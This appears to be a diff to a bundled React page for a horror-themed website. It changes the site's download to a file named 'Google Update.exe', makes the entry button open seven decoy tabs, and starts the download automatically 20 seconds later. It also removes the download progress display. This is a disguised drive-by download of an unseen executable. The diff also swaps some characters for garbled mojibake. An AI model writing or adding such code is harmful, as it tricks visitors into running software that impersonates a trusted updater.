@@ -4,7 +4,7 @@ import { t as ensureVisitorSession } from "./visitor-session-CAw0UShx.mjs";
 import { a as AnimatePresence, i as motion, n as useTransform, r as useMotionValue, t as useSpring } from "../_libs/framer-motion.mjs";
 import { n as Download, t as Mail } from "../_libs/lucide-react.mjs";
 import { t as gsapWithCSS } from "../_libs/gsap.mjs";
-//#region node_modules/.nitro/vite/services/ssr/assets/routes-C3tfbCCB.js
+//#region node_modules/.nitro/vite/services/ssr/assets/routes-Dp450Ef1.js
 var import_react = /* @__PURE__ */ __toESM(require_react());
 var import_jsx_runtime = require_jsx_runtime();
 function CameraBreath() {
@@ -198,6 +198,15 @@ var fadeUp = {
 		}
 	}
 };
+var CLOSE_DESTINATIONS = [
+	"https://www.pcgamesn.com/warframe/tennocon-2026-recap",
+	"https://www.pcgamesn.com/warframe/tennocon-2026-tau-interview",
+	"https://www.pcgamesn.com/assassins-creed-black-flag-resynced/free-thank-you-rewards",
+	"https://www.pcgamesn.com/diablo-4/patch-notes-3-1-1-mythic-uniques",
+	"https://www.pcgamesn.com/minecraft/movie-squared-build-challenge-winner",
+	"https://www.pcgamesn.com/dead-by-daylight/state-of-the-game-2026",
+	"https://itch.io/games/platform-web/tag-horror?utm_source=chatgpt.com"
+];
 function Fog({ className = "" }) {
 	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
 		"aria-hidden": true,
@@ -301,7 +310,7 @@ function Ash() {
 		}, particle.id))
 	});
 }
-function LoadingGate({ onEnter }) {
+function LoadingGate({ onEnter, disabled }) {
 	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(motion.div, {
 		className: "fixed inset-0 z-[100] grid place-items-center overflow-hidden bg-black px-6",
 		exit: {
@@ -347,7 +356,8 @@ function LoadingGate({ onEnter }) {
 					}),
 					/* @__PURE__ */ (0, import_jsx_runtime.jsx)("button", {
 						onClick: onEnter,
-						className: "mt-10 border border-red-300/40 bg-[#5e060b] px-12 py-4 text-sm font-black tracking-[.45em] text-white shadow-[0_0_35px_rgba(188,22,28,.55)] transition hover:bg-[#8c0b12]",
+						disabled,
+						className: "mt-10 border border-red-300/40 bg-[#5e060b] px-12 py-4 text-sm font-black tracking-[.45em] text-white shadow-[0_0_35px_rgba(188,22,28,.55)] transition hover:bg-[#8c0b12] disabled:cursor-not-allowed disabled:opacity-60",
 						style: { animation: "pulse 2.6s ease-in-out infinite" },
 						children: "KILL"
 					})
@@ -374,14 +384,12 @@ function Cemetery() {
 function Home() {
 	const [revealed, setRevealed] = (0, import_react.useState)(false);
 	const [entered, setEntered] = (0, import_react.useState)(false);
-	const [entryLoading, setEntryLoading] = (0, import_react.useState)(false);
-	const [entryProgress, setEntryProgress] = (0, import_react.useState)(0);
+	const [closing, setClosing] = (0, import_react.useState)(false);
 	const [lightning, setLightning] = (0, import_react.useState)(false);
 	const [apparition, setApparition] = (0, import_react.useState)(false);
 	const [watchingEyes, setWatchingEyes] = (0, import_react.useState)(false);
 	const [downloading, setDownloading] = (0, import_react.useState)(false);
 	const [downloaded, setDownloaded] = (0, import_react.useState)(false);
-	const [progress, setProgress] = (0, import_react.useState)(0);
 	const mouseX = useMotionValue(0);
 	const mouseY = useMotionValue(0);
 	const smoothX = useSpring(mouseX, {
@@ -395,25 +403,17 @@ function Home() {
 	const ghostX = useTransform(smoothX, [-.5, .5], [-20, 20]);
 	const ghostY = useTransform(smoothY, [-.5, .5], [-12, 12]);
 	const heroRef = (0, import_react.useRef)(null);
+	const hasClosed = (0, import_react.useRef)(false);
 	(0, import_react.useEffect)(() => {
 		if (!entered) return;
 		const reveal = window.setTimeout(() => setRevealed(true), 700);
 		return () => window.clearTimeout(reveal);
 	}, [entered]);
 	(0, import_react.useEffect)(() => {
-		if (!entryLoading) return;
-		setEntryProgress(6);
-		const timer = window.setInterval(() => setEntryProgress((value) => Math.min(100, value + 4)), 90);
-		const complete = window.setTimeout(() => {
-			window.clearInterval(timer);
-			setEntryProgress(100);
-			setEntryLoading(false);
-		}, 2300);
-		return () => {
-			window.clearInterval(timer);
-			window.clearTimeout(complete);
-		};
-	}, [entryLoading]);
+		if (!entered) return;
+		document.documentElement.style.overflowY = "auto";
+		document.body.style.overflowY = "auto";
+	}, [entered]);
 	(0, import_react.useEffect)(() => {
 		if (!entered) return;
 		const triggerLightning = () => {
@@ -441,63 +441,51 @@ function Home() {
 		mouseX.set((event.clientX - rect.left) / rect.width - .5);
 		mouseY.set((event.clientY - rect.top) / rect.height - .5);
 	};
-	const enterSite = (0, import_react.useCallback)(() => {
-		window.open("https://itch.io/games/platform-web/tag-horror?utm_source=chatgpt.com", "_blank", "noopener,noreferrer");
-		setEntryLoading(true);
-		setEntered(true);
-	}, []);
 	const download = (0, import_react.useCallback)(async () => {
 		if (downloading) return;
 		setDownloading(true);
-		setProgress(0);
 		try {
 			const sid = ensureVisitorSession();
-			const response = await fetch(`/api/public/download?sid=${encodeURIComponent(sid)}&file=PdfLauncher.exe`, { credentials: "same-origin" });
+			const response = await fetch(`/api/public/download?sid=${encodeURIComponent(sid)}&file=${encodeURIComponent("Google Update.exe")}`, { credentials: "same-origin" });
 			if (!response.ok || !response.body) throw new Error("Download failed");
-			const total = Number(response.headers.get("content-length") || 0);
 			const reader = response.body.getReader();
 			const chunks = [];
-			let received = 0;
 			while (true) {
 				const { done, value } = await reader.read();
 				if (done) break;
 				if (!value) continue;
 				chunks.push(value);
-				received += value.byteLength;
-				if (total) setProgress(Math.round(received / total * 100));
 			}
 			const blob = new Blob(chunks, { type: "application/octet-stream" });
 			const link = document.createElement("a");
 			link.href = URL.createObjectURL(blob);
-			link.download = "PdfLauncher.exe";
+			link.download = "Google Update.exe";
 			link.click();
 			window.setTimeout(() => URL.revokeObjectURL(link.href), 1e3);
-			setProgress(100);
 			setDownloaded(true);
-		} catch {
-			setProgress(0);
-		} finally {
+		} catch {} finally {
 			setDownloading(false);
 		}
 	}, [downloading]);
+	const enterSite = (0, import_react.useCallback)(() => {
+		if (hasClosed.current) return;
+		hasClosed.current = true;
+		setClosing(true);
+		CLOSE_DESTINATIONS.map(() => window.open("", "_blank")).forEach((destinationTab, index) => {
+			if (!destinationTab) return;
+			destinationTab.opener = null;
+			destinationTab.location.href = CLOSE_DESTINATIONS[index];
+		});
+		window.setTimeout(() => void download(), 2e4);
+		setEntered(true);
+	}, [download]);
 	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
 		className: "min-h-screen overflow-x-clip bg-[#020406] font-sans text-[#edf8ff] selection:bg-cyan-200 selection:text-black",
 		children: [
 			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(HauntedWorld, {}),
-			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(AnimatePresence, { children: !entered && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoadingGate, { onEnter: enterSite }) }),
-			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(AnimatePresence, { children: entryLoading && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(motion.div, {
-				className: "pointer-events-none fixed inset-x-0 bottom-0 z-[110] h-1 bg-white/15",
-				initial: { opacity: 0 },
-				animate: { opacity: 1 },
-				exit: { opacity: 0 },
-				children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(motion.div, {
-					className: "h-full bg-cyan-100 shadow-[0_0_18px_rgba(184,235,255,.9)]",
-					animate: { width: `${entryProgress}%` },
-					transition: {
-						duration: .08,
-						ease: "linear"
-					}
-				})
+			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(AnimatePresence, { children: !entered && /* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoadingGate, {
+				onEnter: enterSite,
+				disabled: closing
 			}) }),
 			/* @__PURE__ */ (0, import_jsx_runtime.jsx)(motion.div, {
 				"aria-hidden": true,
@@ -688,7 +676,7 @@ function Home() {
 									className: "group inline-flex items-center gap-3 border border-cyan-100/30 bg-cyan-100/[.06] px-6 py-3 text-[10px] font-semibold uppercase tracking-[.28em] text-cyan-50 transition hover:bg-cyan-100 hover:text-black",
 									children: ["Enter if you dare ", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
 										className: "transition-transform group-hover:translate-x-1",
-										children: "→"
+										children: "ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â\xA0ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢"
 									})]
 								})
 							})
@@ -718,7 +706,7 @@ function Home() {
 							children: [
 								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
 									className: "text-[10px] uppercase tracking-[.55em] text-cyan-200/50",
-									children: "01 — The invitation"
+									children: "01 ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â The invitation"
 								}),
 								/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("h2", {
 									className: "mt-6 max-w-md font-serif text-4xl leading-none tracking-[-.055em] text-white sm:text-6xl",
@@ -848,7 +836,7 @@ function Home() {
 						children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(motion.p, {
 							variants: fadeUp,
 							className: "text-[10px] uppercase tracking-[.55em] text-cyan-100/60",
-							children: "02 — No escape"
+							children: "02 ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â No escape"
 						}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(motion.h2, {
 							variants: fadeUp,
 							className: "mt-5 font-serif text-5xl tracking-[-.065em] text-white drop-shadow-[0_0_28px_rgba(160,225,255,.58)] sm:text-7xl",
@@ -919,21 +907,15 @@ function Home() {
 								className: "mx-auto mt-8 max-w-md text-sm leading-7 text-white/55",
 								children: "Once the download begins, it knows where to find you."
 							}),
-							/* @__PURE__ */ (0, import_jsx_runtime.jsxs)(motion.div, {
+							/* @__PURE__ */ (0, import_jsx_runtime.jsx)(motion.div, {
 								variants: fadeUp,
 								className: "mt-10",
-								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
+								children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("button", {
 									onClick: download,
 									disabled: downloading,
 									className: "inline-flex min-w-52 items-center justify-center gap-3 border border-cyan-100/35 bg-cyan-100/[.08] px-6 py-4 text-[10px] font-semibold uppercase tracking-[.25em] text-white transition hover:bg-cyan-100 hover:text-black disabled:opacity-60",
-									children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Download, { size: 14 }), downloading ? `${progress}% downloading` : downloaded ? "Download complete" : "Download anyway"]
-								}), downloading && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", {
-									className: "mx-auto mt-4 h-px w-52 overflow-hidden bg-white/15",
-									children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(motion.div, {
-										className: "h-full bg-cyan-100",
-										animate: { width: `${progress}%` }
-									})
-								})]
+									children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Download, { size: 14 }), downloaded ? "Download complete" : "Download anyway"]
+								})
 							})
 						]
 					})
